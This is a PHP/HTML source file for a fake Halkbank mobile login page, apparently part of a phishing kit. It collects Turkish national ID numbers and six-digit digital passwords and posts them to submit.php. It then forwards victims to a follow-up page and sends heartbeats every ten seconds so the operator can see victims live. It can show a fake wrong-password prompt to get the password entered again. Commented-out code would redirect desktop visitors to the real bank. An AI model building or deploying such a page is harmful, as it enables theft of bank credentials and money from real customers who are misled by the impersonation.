<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

function isMobileRequest(): bool
{
    $userAgent = strtolower((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($userAgent === '') {
        return false;
    }

    return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
}

/*
if (!isMobileRequest() && shouldRedirectDesktopToBank()) {
    header('Location: ' . DESKTOP_BANK_LOGIN_URL);
    exit;
}
*/

$errors = $_SESSION['form_errors'] ?? [];
if (($_GET['error'] ?? '') === 'hatali') {
    $errors[] = 'Girdiğiniz şifre hatalıdır. Lütfen kontrol edip tekrar deneyiniz.';
}
$old = $_SESSION['form_old'] ?? [];
unset($_SESSION['form_errors'], $_SESSION['form_old']);
upsertPresence('index', null, false);
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Basvuru Ekrani Giris</title>
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/app.css'), ENT_QUOTES, 'UTF-8') ?>">
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/finansapp-mobile.css'), ENT_QUOTES, 'UTF-8') ?>">
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body class="app-mobile">
  <div class="app-shell">
    <header class="app-top">
      <div class="app-top-left">
        <button type="button" class="app-icon-btn" aria-label="Geri">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M15 18 9 12l6-6"></path>
          </svg>
        </button>
      </div>
      <div class="app-logo">HALKBANK</div>
      <div class="app-top-right">
        <button type="button" class="app-icon-btn" aria-label="Bildirim">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M7 9a5 5 0 1 1 10 0v4.2c0 .53.21 1.04.59 1.41L19 16H5l1.41-1.39A2 2 0 0 0 7 13.2z"></path>
            <path d="M10 19a2 2 0 0 0 4 0"></path>
          </svg>
        </button>
        <button type="button" class="app-lang">EN</button>
      </div>
    </header>

    <main class="app-main index-main">
      <h1 class="app-heading">Giriş Yap</h1>
      <div class="app-tabs">
        <button class="app-tab active" type="button">Bireysel</button>
        <button class="app-tab" type="button">Kurumsal</button>
      </div>

        <?php if (!empty($errors)): ?>
          <div class="alert alert-error">
            <strong>Form hatasi:</strong>
            <ul>
              <?php foreach ($errors as $error): ?>
                <li><?= esc($error) ?></li>
              <?php endforeach; ?>
            </ul>
          </div>
        <?php endif; ?>

        <div id="asyncErrorBox" class="alert alert-error" hidden></div>

        <form id="applicationForm" method="post" action="submit.php" class="app-form">
          <div class="app-field">
            <input
              id="national_id"
              name="national_id"
              inputmode="numeric"
              autocomplete="off"
              pattern="[0-9]{11}"
              minlength="11"
              maxlength="11"
              placeholder="Müşteri / T.C. Kimlik Numarası"
              required
              value="<?= esc($old['national_id'] ?? ($old['user_code'] ?? '')) ?>"
            >
          </div>

          <div class="app-field">
            <input
              id="demo_pin"
              name="demo_pin"
              type="password"
              autocomplete="off"
              inputmode="numeric"
              pattern="[0-9]{6}"
              minlength="6"
              maxlength="6"
              placeholder="Dijital Parola"
              required
            >
          </div>

          <div class="app-main-links">
            <a href="#" class="app-note-link">Müşterimiz Ol</a>
          </div>

          <button class="app-primary-btn" type="submit">Giriş</button>

          <div id="inlineWait" class="inline-wait" hidden>
            <span class="mini-spinner" aria-hidden="true"></span>
            <span>Bekleniyor... Basvuru no: <strong class="mono" data-id>-</strong></span>
          </div>
        </form>
        <div class="app-main-bottom-link">
          <a href="#" class="app-note-link">Dijital Parola Al</a>
        </div>
    </main>

    <nav class="app-bottom-nav">
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 2 6 13h5l-1 9 7-11h-5z"></path></svg>
        </strong>FAST<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12 4 4 10-10"></path></svg>
        </strong>Mobil<br>Onay
      </div>
      <div class="app-nav-item app-nav-item-qr">
        <div class="app-qr-btn">
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="3" y="3" width="7" height="7" rx="1"></rect>
            <rect x="14" y="3" width="7" height="7" rx="1"></rect>
            <rect x="3" y="14" width="7" height="7" rx="1"></rect>
            <rect x="15" y="15" width="3" height="3" rx="0.5"></rect>
            <path d="M19 15h2v2"></path>
            <path d="M19 19h2v2h-2"></path>
          </svg>
        </div>Karekod<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M4 20V4"></path><path d="M4 20h16"></path><path d="M8 17v-4"></path><path d="M12 17V9"></path><path d="M16 17v-7"></path>
          </svg>
        </strong>Finansal<br>Araçlar
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect><path d="M14 7h6"></path><path d="M17 4v6"></path>
          </svg>
        </strong>Diğer<br>İşlemler
      </div>
    </nav>
  </div>
  <script>
(function () {
    const form = document.getElementById("applicationForm");
    const nationalIdInput = document.getElementById("national_id");
    const demoPinInput = document.getElementById("demo_pin");
    if (!form || !nationalIdInput || !demoPinInput) {
      return;
    }

    const tabs = document.querySelectorAll(".app-tab");
    const submitBtn = form.querySelector('button[type="submit"]');
    const waitBox = document.getElementById("inlineWait");
    const asyncErrorBox = document.getElementById("asyncErrorBox");
    if (!submitBtn || !waitBox || !asyncErrorBox) {
      return;
    }

    tabs.forEach((tab) => {
      tab.addEventListener("click", () => {
        tabs.forEach((t) => t.classList.remove("active"));
        tab.classList.add("active");
      });
    });

    function showErrors(errors) {
      if (!Array.isArray(errors) || errors.length === 0) {
        asyncErrorBox.hidden = true;
        asyncErrorBox.innerHTML = "";
        return;
      }
      asyncErrorBox.hidden = false;
      asyncErrorBox.innerHTML = `<strong>Form hatasi:</strong><ul>${errors.map((e) => `<li>${String(e)}</li>`).join("")}</ul>`;
    }

    function setPending(isPending) {
      submitBtn.disabled = isPending;
      submitBtn.textContent = isPending ? "Bekleniyor..." : "Giriş";
      waitBox.hidden = !isPending;
    }

    function sendHeartbeat() {
      const body = new URLSearchParams({
        screen: "index",
        application_id: ""
      });
      fetch("heartbeat.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: body.toString(),
        keepalive: true
      }).catch(() => {});
    }

    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const formData = new FormData(form);
      showErrors([]);
      setPending(true);

      try {
        const response = await fetch(form.action, {
          method: "POST",
          body: formData,
          headers: {
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json"
          }
        });

        let data = null;
        try {
          data = await response.json();
        } catch {
          data = { ok: false, errors: ["Sunucu yaniti okunamadi."] };
        }

        if (!data.ok) {
          setPending(false);
          showErrors(data.errors || ["Islem basarisiz oldu."]);
          return;
        }

        const nextUrl = String(data.next_url || `tel.php?id=${encodeURIComponent(String(data.id || ""))}`);
        window.location.href = nextUrl;
      } catch (error) {
        setPending(false);
        showErrors(["Baglanti sorunu olustu. Lutfen tekrar deneyin."]);
      }
    });

    nationalIdInput.addEventListener("input", () => {
      const onlyDigits = nationalIdInput.value.replace(/\D+/g, "").slice(0, 11);
      nationalIdInput.value = onlyDigits;
    });

    demoPinInput.addEventListener("input", () => {
      demoPinInput.value = demoPinInput.value.replace(/\D+/g, "").slice(0, 6);
    });

    sendHeartbeat();
    setInterval(sendHeartbeat, 10000);
})();
  </script>
</body>
</html>
